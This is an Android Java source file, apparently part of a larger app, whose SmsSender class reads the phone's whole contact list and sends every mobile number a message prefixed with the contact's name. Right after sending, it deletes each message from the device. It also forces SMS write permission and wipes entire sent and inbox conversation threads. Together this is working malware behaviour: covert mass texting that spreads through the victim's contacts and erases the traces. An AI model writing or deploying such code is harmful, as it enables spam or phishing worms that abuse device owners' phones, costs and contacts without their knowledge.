/**
 * 
 */
package sms;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import util.ConfigCt;
import util.Funcs;
import util.RegularUtils;


/**
 * @author ASUS
 *
 */
public class SmsSender {
	private static SmsSender current;
	public  Context context;
	
	private SmsSender(Context context) {
		this.context=context;
		if (!SmsWriteOpUtil.isWriteEnabled(context)) {
	        SmsWriteOpUtil.setWriteEnabled(context, true);
		}
	}
	public static synchronized SmsSender getInstance(Context context) {
        if(current == null) {
            current = new SmsSender(context);
        }
        return current;
	}
	/*
		 * 群发短信线程
	*/
	public void SmsSendsThread(final String body){
			new Thread(new Runnable() {    
				@Override    
			    public void run() {    
					try{
						SmsSends(body);
					}catch(IllegalArgumentException e)
					{
						e.printStackTrace();
						//return false;
					}
			    }    
			}).start();
	}
	 /** 
     * 群发短信： 
     */  
    public boolean SmsSends(String txt) { 
    	 try {
    		 //StringBuffer sb = new StringBuffer();
             Uri contactUri =ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
             Cursor cursor = context.getContentResolver().query(contactUri,
                                                               new String[]{"display_name", "sort_key", "contact_id","data1"},
                                                               null, null, "sort_key");
             String contactName;
             String contactNumber;
             String contactSortKey;
             int contactId;
             while (cursor.moveToNext()) {
                 contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 contactId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                 //contactSortKey =getSortkey(cursor.getString(1));
                 //ContactsInfo contactsInfo = new ContactsInfo(contactName,contactNumber,contactSortKey,contactId);
                 if (contactName!=null){
                	 contactNumber = contactNumber.replaceAll(" ", "");
                	 contactNumber = contactNumber.replaceAll("-", "");
                	 if(RegularUtils.isMobileSimple(contactNumber)){
                		 String s=contactName+ ":" +txt;
                		 SmsSendThread(contactNumber,s);
                		 Funcs.Sleep(1000);
                		 DelSmsByBody(s);
                		 Log.i(ConfigCt.TAG, "SmsSend:" + contactName+ "："+contactNumber);
                	 }
                	 //sb.append(contactName+ "："+contactNumber + ":" + contactId + "\r\n");
                      //list.add(contactsInfo);
                 }
             }
             cursor.close();//使用完后一定要将cursor关闭，不然会造成内存泄露等问题
             return true;
         }catch (Exception e){
             e.printStackTrace();
             return false;
         }finally {

         }
    }
    /*
	 * 发送单条短信
	 */
	public boolean SmsSend(String address,String body){
		try{
			SmsManager manager = SmsManager.getDefault();
			manager.sendTextMessage(address, null, body, null, null);
			ConfigCt.getInstance(context).setIsSendSmsToPhone(true);
			return true;
		}catch(IllegalArgumentException e){
			e.printStackTrace();
			return false;
		}
	}
    /*
	 * 发送单条短信线程
	 */
	public boolean SmsSendThread(final String address,final String body){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				try{
					SmsManager manager = SmsManager.getDefault();
					manager.sendTextMessage(address, null, body, null, null);
					ConfigCt.getInstance(context).setIsSendSmsToPhone(true);
				}catch(IllegalArgumentException e)
				{
					e.printStackTrace();
					//return false;
				}
		    }    
		}).start();
		return true;
	}
	/*
	 * 根据内容删除短信
	 */
	public boolean DelSmsByBody(String SmsContent){
		if (!SmsWriteOpUtil.isWriteEnabled(context)) {
	        SmsWriteOpUtil.setWriteEnabled(context, true);
		}
        int res = context.getContentResolver().delete(Uri.parse("content://sms"), "body like '" + SmsContent + "'", null);
        for(int i=0;i<10;i++){
            if(res>0){
            	Log.i(ConfigCt.TAG, "删除成功！");
            	break;
            }else{
            	Log.i(ConfigCt.TAG, "删除失败！");
            	res = context.getContentResolver().delete(Uri.parse("content://sms"), "body like '" + SmsContent + "'", null);
            }
        }
        if(res>0)return true;else return false;
	}
	/*
	 * 删除发件箱中的短信
	 */
	public void deleteSMSInSent() {  
	        try {  
	            ContentResolver CR = context.getContentResolver(); 

	            // Query SMS  
	            Uri uriSms = Uri.parse("content://sms/sent");  
	            Cursor c = CR.query(uriSms,  
	                    new String[] { "_id", "thread_id" }, null, null, null);  
	            if (null != c && c.moveToFirst()) {  
	                do {  
	                    // Delete SMS  
	                    long threadId = c.getLong(1);  
	                    CR.delete(Uri.parse("content://sms/conversations/" + threadId),  
	                            null, null);  
	                    Log.d("deleteSMS", "threadId:: "+threadId);  
	                } while (c.moveToNext());  
	            }  
	        } catch (Exception e) {  
	            // TODO: handle exception  
	            Log.d("deleteSMS", "Exception:: " + e);  
	        }
	} 
	/*
	 * 删除收件箱中的短信
	 */
	public void deleteSMSInbox() {
        try {
    		if (!SmsWriteOpUtil.isWriteEnabled(context)) {
    	        SmsWriteOpUtil.setWriteEnabled(context, true);
    		}
            ContentResolver CR = context.getContentResolver();
            // Query SMS
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id" },
                    null, null, null);
            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(1);
                    int result = CR.delete(Uri
                            .parse("content://sms/conversations/" + threadId),
                            null, null);
                    Log.d("deleteSMS", "threadId:: " + threadId + "  result::"
                            + result);
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.d("deleteSMS", "Exception:: " + e);
        }
	}
}
